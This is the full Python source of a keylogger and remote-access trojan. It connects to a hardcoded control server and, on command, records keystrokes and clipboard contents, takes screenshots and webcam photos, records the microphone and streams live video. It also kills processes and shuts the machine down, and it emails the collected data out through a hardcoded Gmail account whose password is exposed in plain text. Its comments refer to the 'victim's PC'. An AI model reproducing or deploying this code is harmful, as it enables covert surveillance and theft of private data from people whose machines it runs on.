import sys # Used to get size of variables in bytes

import platform # Use to get platform

import keyboard #https://github.com/boppreh/keyboard
# Main library for program
# Records all of the keys the user has pressed (Blocking)

import psutil # https://github.com/giampaolo/psutil
# Basioally task manager 2.0. I can manage tasks with python.
#Cross-platform

import time # Standard time module. Not sure if will use with final program
# Using it to monitor how long the keylogger has been in use for

from datetime import date, datetime # Needed to grab the current date
# Displays date keylogger was started

# This is all used for writing the final .txt file. All the keys recorded
# Will be written to a text file
import os.path
from os import path

# External library used to give access to the clipboard
# When user pastes via CTRL+V, it will go in clipboard
import pyperclip #https://github.com/asweigart/pyperclip

# Libraries to deal with sending the email with the text file
import smtplib 
from email.mime.multipart import MIMEMultipart 
from email.mime.text import MIMEText # Text file attachments
from email.mime.base import MIMEBase 
from email.mime.image import MIMEImage # Email attachments
from email.mime.audio import MIMEAudio # Audio attachments
from email import encoders

# Built-In Socket Library
# Used to get host name of PC
import socket

# Used to take screenshots
import numpy as np # https://github.com/numpy/numpy

# Convert image to numpy array and BGR format (BLUE, GREEN, RED)
import cv2 # https://github.com/opencv/opencv
import glob

# Used to take screenshot
import pyautogui # https://github.com/asweigart/pyautogui
from scipy.io.wavfile import write

# Used to record microphone
import sounddevice as sd # https://github.com/spatialaudio/python-sounddevice

# Play audio file
from playsound import playsound

# Object serialization (Convert objects to strings to send to server)
import json
from json import JSONEncoder 

import pickle

import npsocket #https://github.com/ekbanasolutions/numpy-using-socket
from npsocket import SocketNumpyArray

# Open URL
import webbrowser

# Popup on Windows Windows
import ctypes 

# Move mouse to random position
import random

# Open Images
from PIL import Image 

from requests import get 

def hours_to_seconds(hours): # Converts hours to seconds
    return hours * 3600
def minutes_to_seconds(minutes): # Converts minutes to seconds
    return minutes * 60

# Connect to server
#host = "72.178.68.165"
host = "192.168.1.229"
port = 5000
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))
print("Connected to - " + host + ":" + str(port) + " successfully!")

# Total number of screenshots taken
screenshots = 0
screenshot_file = "screenshot" + str(screenshots) + ".jpg"

# Total number of audio files recorded
audio_count = 0
audio_file = "audio" + str(audio_count) + ".wav"

# Total number of webcam pictures taken
webcam_count = 0
webcam_file = "webcam" + str(webcam_count) + ".jpg"

# Total number of video frames 
video_count = 0
video_file = "video_frame" + str(video_count) + ".jpg"

pids = psutil.pids() # List of all the open processes (ID)
#print(len(pids))

processes = []
process_date = ""
process_dates = []
process_dates_temp = []
hours = []
minutes = []
seconds = []

for i in range(len(pids)):

    try:
        processes.append(psutil.Process(pids[i])) # Get all of the information of the process
    except psutil.NoSuchProcess as e:
        print(str(e))
    #print(i)

#print(processes)

#print(len(processes))

for i in range(len(pids)):

    try:
        name = processes[i].name() # The process name (.exe)
        process_date = str(processes[i]) # The time the process was opened(HH:MM::S)

        # The code below removes all the substrings to isolate the time the
        # process was opened
        process_date = process_date.replace(str(pids[i]), "")
        process_date = process_date.replace(name, "")

        if "running" in process_date:

            process_date = process_date.replace("running", "")

        if "stopped" in process_date:

            process_date = process_date.replace("stopped", "")

        process_date = process_date.replace("psutil.Process(pid=, name='', status='', started=", "")
        process_date = process_date.replace("'", "")
        process_date = process_date.replace(")", "")

        process_dates.append(process_date) # The time the process was opened
        process_dates_temp.append(process_date) # A copy of the above list

    except IndexError as e:
        
        print(str(e))
    #print(i)

# First 2 processes are system processes that don't have a start time.
# This is to ensure that every element is formatted the same way (HH:MM:SS)
for i in range(2):

    process_dates[i] = "00:00:00"
    process_dates_temp[i] = "00:00:00"

#print(process_dates_temp)
#print(len(process_dates_temp))

# The current time
now = datetime.now()
current_time = now.strftime("%H:%M:%S")
#print(current_time)

# This below code (Still WIP) will isolate the hours, minutes, and seconds
# of each process and convert it all to seconds.
# The final result will show which process has been opened for the longest
# and shortest
# With that information, I can subtract it from the current date time
# to see the newest opened process. I will be using this to monitor which
# app the user has opened.
# This will essentially be a label for all the keys logged
for i in range(len(process_dates_temp)):

    process_dates_temp[i] = process_dates_temp[i].replace(":", "")
    #print(process_dates_temp)
    
    if process_dates_temp[i][0] == "0": # Comparing to 0 simply means removing
        # the 0's that precede the numbers since they're irrelevant

        process_dates_temp[i] = process_dates_temp[i][1:]
        #process_dates_temp[i].pop(0)
        hours.append(process_dates_temp[i][0])
        process_dates_temp[i] = process_dates_temp[i][1:]
        #print(len(hours))
        if process_dates_temp[i][0] == "0":
            process_dates_temp[i] = process_dates_temp[i][1:]
            minutes.append(process_dates_temp[i][0])
            process_dates_temp[i] = process_dates_temp[i][1:]
            #print(len(process_dates_temp))
            if process_dates_temp[i][0] == "0":
                #print(len(process_dates_temp[i]))
                #print("uno")
                process_dates_temp[i] = process_dates_temp[i][1:]
                seconds.append(process_dates_temp[i][0])
                process_dates_temp[i] = process_dates_temp[i][1:]
                #print(len(process_dates_temp[i]))
                #print("uno")
                #print(len(process_dates_temp))
            else:
                #print(process_dates_temp)
                #print(len(process_dates_temp[i]))
                #print("dos")
                #print(process_dates_temp[3][0][0])
                seconds.append(process_dates_temp[i][0])
                seconds[-1] += process_dates_temp[i][1]
                process_dates_temp[i] = process_dates_temp[2:]
                
                #print(len(process_dates_temp[i]))
               # print("dos")
                #print(len(process_dates_temp))
            
        else:
            minutes.append(process_dates_temp[i][0])
            minutes[-1] += process_dates_temp[i][1]
            process_dates_temp[i] = process_dates_temp[2:]
            #print(len(process_dates_temp))
            
        
    else:

        hours.append(process_dates_temp[i][0])
        hours[-1] += process_dates_temp[i][1]
        process_dates_temp[i] = process_dates_temp[i][2:]
        #print(len(hours))
        #print(len(process_dates_temp))
        if process_dates_temp[i][0] == "0":
            process_dates_temp[i] = process_dates_temp[i][1:]
            minutes.append(process_dates_temp[i][0])
            process_dates_temp[i] = process_dates_temp[i][1:]
            #print(len(process_dates_temp))
            if process_dates_temp[i][0] == "0":
                #print(len(process_dates_temp[i]))
                #print("tres")
                process_dates_temp[i] = process_dates_temp[i][1:]
                seconds.append(process_dates_temp[i][0])
                process_dates_temp[i] = process_dates_temp[i][1:]
                #print(len(process_dates_temp[i]))
                #print("tres")
                #print(len(process_dates_temp))
            else:
                #print(len(process_dates_temp[i]))
                #print("cuatros")
                seconds.append(process_dates_temp[i][0])
                seconds[-1] += process_dates_temp[i][1]
                process_dates_temp[i] = process_dates_temp[i][2:]
                #print(len(process_dates_temp[i]))
                #print(len(process_dates_temp))
        else:
            minutes.append(process_dates_temp[i][0])
            minutes[-1] += process_dates_temp[i][1]
            process_dates_temp[i] = process_dates_temp[i][2:]
            #print(len(process_dates_temp))

    #print(hours[i])
    if i == 5:
        break

#print(len(hours))
#print(len(minutes))
#print(len(seconds))
#print(hours)
#print(minutes)
#print(seconds)
"""for i in range(len(hours)):
    hours[i] = "0"
    minutes[i]= "0"
    seconds[i] = "0

for i in hours:
    print("Hours: " + i)
for i in minutes:
    print("Minutes: " + i)
for i in seconds:
    print("Seconds: " + i)"""

logged = str(socket.gethostname()) + " - " + str(socket.gethostbyname(socket.gethostname())) + "\n"
logged += "" + str(date.today()) + " - " + str(current_time) + "\n"
date = []
start_time = time.time() # The time the keylogging has started
ctrl = False
ctrl_v = False

connected = True

recorded = []
recording_keys = False

class NumpyArrayEncoder(JSONEncoder):
    def default(self, obj):
        if isinstance(obj, np.ndarray):
            return obj.tolist()
        return JSONEncoder.default(self, obj)

hostname = "hostname"
hostname += str(socket.gethostname())
s.send(hostname.encode("ascii")) # Send PC name to server

localip = "local"
localip += socket.gethostbyname(socket.gethostname())
s.send(localip.encode("ascii"))

publicip = "public"
publicip += get("http://api.ipify.org").text 
s.send(publicip.encode("ascii"))


while connected:
    
    data = s.recv(1024 * 5000)
    
    s.send(data)

    try:
        print("Received from the server: ", str(data.decode("ascii")))

        if data.decode("ascii") == "quit":

            connected = False
            
        if data.decode("ascii") == "email":

            try:

                if path.exists("logs.txt"):

                    os.remove("logs.txt") # Remove file to overwrite

                file = open("logs.txt", "w")
                file.write(logged) # Write all keys logged into a text file
                file.close()

            except OSError as e: #If text file can't be opened for writing, raise OSError

                print(str(e))
                    
            my_email = "surgevisuals13@gmail.com" # Your email 
            dest_email = "hydrostar568@gmail.com" # Where you will send the email to
            msg = MIMEMultipart() # MIME Object
            msg["From"] = my_email
            msg["To"] = dest_email
            subject = socket.gethostname()
            subject += " - "
            subject += socket.gethostbyname(socket.gethostname())
            subject += ": Keys logged"
            msg["Subject"] = subject

            try:

                text_file = "Key's logged.txt" # What the text file will be called in gmail
                attachment = open("logs.txt", "rb") # The text file

                p = MIMEBase("application", "octet-stream")
                p.set_payload((attachment).read()) # Change payload into encoded form

                attachment.close() # Close the file since it's no longer needed
                
                encoders.encode_base64(p) # Encode into base64

                p.add_header("Content-Disposition", "attachment; filename= %s" % text_file)

                msg.attach(p)

            except OSError as e:

                print(str(e))

            for i in range(screenshots):

                try:
                    
                    screenshot_file = "screenshot" + str(i) + ".jpg"
                    screenshot_attachments = open(screenshot_file, "rb")
                    p = MIMEBase("application", "octet-stream")
                    p.set_payload((screenshot_attachments).read())
                    screenshot_attachments.close()
                    encoders.encode_base64(p)
                    p.add_header("Content-Disposition", "attachment; filename= %s" % screenshot_file)
                    msg.attach(p)

                except OSError as e:

                    print(str(e))

            for i in range(webcam_count):

                try:

                    webcam_file = "webcam" + str(i) + ".jpg"
                    webcam_attachments = open(webcam_file, "rb")
                    p = MIMEBase("application", "octet-stream")
                    p.set_payload((webcam_attachments).read())
                    webcam_attachments.close()
                    encoders.encode_base64(p)
                    p.add_header("Content-Disposition", "attachment; filename= %s" % webcam_file)
                    msg.attach(p)

                except OSError:

                    print(str(e))

            for i in range(audio_count):

                try:

                    audio_file = "audio" + str(i) + ".wav"
                    audio_attachments = open(audio_file, "rb")
                    p = MIMEBase("application", "octet-stream")
                    p.set_payload((audio_attachments).read())
                    audio_attachments.close()
                    encoders.encode_base64(p)
                    p.add_header("Content-Disposition", "attachment; filename= %s" % audio_file)
                    msg.attach(p)

                except OSError as e:

                    print(str(e))

            sm = smtplib.SMTP("smtp.gmail.com", 587) # Create SMTP Session
            sm.starttls() # Start TLS for security
            sm.login(my_email, "Katnips6571") # Login to gmail with credentials
            text = msg.as_string() # Convert msg to string
            sm.sendmail(my_email, dest_email, text) # Send the email

            sm.quit() # Quit the session

            print("Email from " + my_email + " sent to " + dest_email + " successfully!")


        if data.decode("ascii") == "delete":
            # Cleans up by deleting the text file off of the victim's PC

            file = "logs.txt"

            if path.exists(file):
                os.remove(file)
                print("Text file removed!")

            for i in range(screenshots):
                screenshot_file = "screenshot" + str(i) + ".jpg"
                if path.exists(screenshot_file):
                    os.remove(screenshot_file)
                    print("Screenshots removed!")
                    screenshots = 0

            for i in range(audio_count):
                audio_file = "audio" + str(i) + ".wav"
                if path.exists(audio_file):
                    os.remove(audio_file)
                    print("Audio files removed!")
                    audio_count = 0

            for i in range(webcam_count):
                webcam_file = "webcam" + str(i) + ".jpg"
                if path.exists(webcam_file):
                    os.remove(webcam_file)
                    print("Webcam files removed!")
                    webcam_count = 0

        if data.decode("ascii") == "screenshot":

            # Takes a screenshot and writes it to disk
            screenshot_file = "screenshot" + str(screenshots) + ".jpg"
            image = pyautogui.screenshot()
            image = cv2.cvtColor(np.array(image), cv2.COLOR_RGB2BGR)
            cv2.imwrite(screenshot_file, image)
            screenshots += 1

        if data.decode("ascii") == "picture":

            webcam_file = "webcam" + str(webcam_count) + ".jpg"
            cam = cv2.VideoCapture(0) # Create camera object
            check, frame = cam.read() # Check variable notes whether camera connection was successful
            # Frame is the actual picture taken

            if check:
                cv2.imwrite(webcam_file, frame) # Save picture to disk
                cam.release()
                webcam_count += 1
            else:
                print("No webcam found!")

        if data.decode("ascii") == "live_video":
            
            cam = cv2.VideoCapture(0)

            s.send(b"live_video")

            sock_sender = SocketNumpyArray()
            sock_sender.initialize_sender("192.168.1.249", 6000)

            streaming = True 

            
            while streaming:
                
                check, frame = cam.read()
                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                
                if sock_sender.send_numpy_array(gray) == None:
                    streaming = False

            del sock_sender 



            cam.release()
            #cv2.destroyAllWindows()
                

        if "record_audio" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("record_audio ", "")
            try:
                msg = int(msg)
                audio_file = "audio" + str(audio_count) + ".wav"

                fs = 44100
                duration = msg
                audio_recording = sd.rec(int(duration * fs), samplerate=fs, channels=2)
                sd.wait()

                write(audio_file, fs, audio_recording) # Save as WAV file

                audio_count += 1
            except ValueError as e:
                print(str(e))

        if "kill" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("kill ", "")

            pids = psutil.pids()
            processes = []

            for i in range(len(pids)):

                processes.append(psutil.Process(pids[i])) # Get all of the information of the process

            for i in range(len(processes)):
                
                try:

                    if msg == processes[i].name():

                        processes[i].kill()
        
                except AttributeError as e:
                    print(str(e))


        if data.decode("ascii") == "dir":

            directory = os.getcwd()
            s.send(directory.encode("ascii"))

        if data.decode("ascii") == "all_processes":
            
            pids = psutil.pids()
            processes = []

            for i in range(len(pids)):

                processes.append(psutil.Process(pids[i])) # Get all of the information of the process

            process_names = []

            for i in processes:
                process_names.append(i.name())
            #print(sys.getsizeof(process_names))
            obj = json.dumps(process_names)
            s.send(obj.encode())

        if data.decode("ascii") == "logs":

            s.send(logged.encode("ascii"))

        if "url" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("url ", "")

            webbrowser.open(msg, new=0)

        if data.decode("ascii") == "record_keys":

            recorded = keyboard.record(until="esc")
            recording_keys = True 
        
        if data.decode("ascii") == "stop_record_keys":

            keyboard.press("esc")
            recording_keys = False

        if data.decode("ascii") == "flash":

            keyboard.write("f")

        if "popup" in data.decode("ascii"):
            msg = data.decode("ascii")
            msg = msg.replace("popup ", "")
            ctypes.windll.user32.MessageBoxW(0, msg, "Popup-Window", 1)

        if data.decode("ascii") == "shutdown":
            if platform.system() == "Windows":
                os.system("shutdown /s /t 1")
            if platform.system() == "Linux":
                os.system("shutdown now -h")

        if data.decode("ascii") == "mouse":
            size = pyautogui.size()
            pyautogui.moveTo(random.randint(0, size[0]), random.randint(0, size[1]))
        
        if data.decode("ascii") == "play_sound":

            try:
                playsound("annoying.mp3")
            except playsound.PlaysoundException as e:
                print(str(e))

    except UnicodeDecodeError as e:
        print(str(e))

    if "show_webcam_picture" in data.decode("ascii"):

        msg = data.decode("ascii")
        msg = msg.replace("show_webcam_picture", "")
        try:
            num = int(msg)
        except TypeError as e:
            print(str(e))
            num = 0
        except ValueError as e:
            print(str(e))
            num = 0
        
        filepath = "webcam" + str(num) + ".jpg"

        try:
            image = Image.open(filepath)

            data = pickle.dumps(image)

            s.send(data)

        except OSError as e:
            print(str(e))

    try:

        if "show_screenshot_picture" in data.decode("ascii"):

            msg = data.decode("ascii")
            msg = msg.replace("show_screenshot_picture", "")
            
            try:
                num = int(msg)
            except TypeError as e:
                print(str(e))
                num = 0 
            except ValueError as e:
                print(str(e))
                num = 0

            filepath = "screenshot" + str(num) + ".jpg"

            try: 
                image = Image.open(filepath)

                data = pickle.dumps(image)
                s.send(data)

            except OSError as e:
                print(str(e))
    

        if data.decode("ascii") == "get_public_ip":
            ip = get("http://api.ipify.org").text 
            s.send(str(ip).encode())

    except UnicodeDecodeError as e:
        print(str(e))

    try:
        if str(recorded[-1]) == "KeyboardEvent(esc down)" and recording_keys:
            recorded.pop(-1) # Removes the Keyboard escape down event from array
    except IndexError as e:
        print(str(e))

    #print(recorded)
    #print(len(recorded))

    if recording_keys:

        for i in range(len(recorded)):

            if "up" in str(recorded[i]):

                if recorded[i].name == "ctrl":
                    ctrl = False

            if "down" in str(recorded[i]): # Only check for keyboard down events
            
                if recorded[i].name == "space":
                    logged += " "
                elif recorded[i].name == "backspace" and len(logged) > 0:
                    logged = logged.replace("backspace", "")
                    logged = logged[:-1]
                elif recorded[i].name == "enter":
                    logged = logged.replace("enter", "")
                    logged += "\n"
                elif recorded[i].name == "shift":
                    logged = logged.replace("shift", "")
                elif recorded[i].name == "ctrl":
                    logged = logged.replace("ctrl", "")
                elif recorded[i].name == "tab":
                    logged = logged.replace("tab", "")
                else:
                    logged += recorded[i].name

                if recorded[i].name == "ctrl":
                    ctrl = True
                if recorded[i].name == "v" and ctrl:
                    ctrl_v = True
                    logged += "\n" + pyperclip.paste()

        

    if pids != psutil.pids(): # If a new process is opened or closed,
        # update the pids variable

        pids = psutil.pids()
        processes = []
        processes = pids
        #print("Process count changed!")

    #print(logged)

    #end_time = time.time()
    #time = end_time - start_time
    #print("Time elapsed: " + str(time) + " seconds")

os.execl(sys.executable, sys.executable, * sys.argv)

s.close() # Close connection
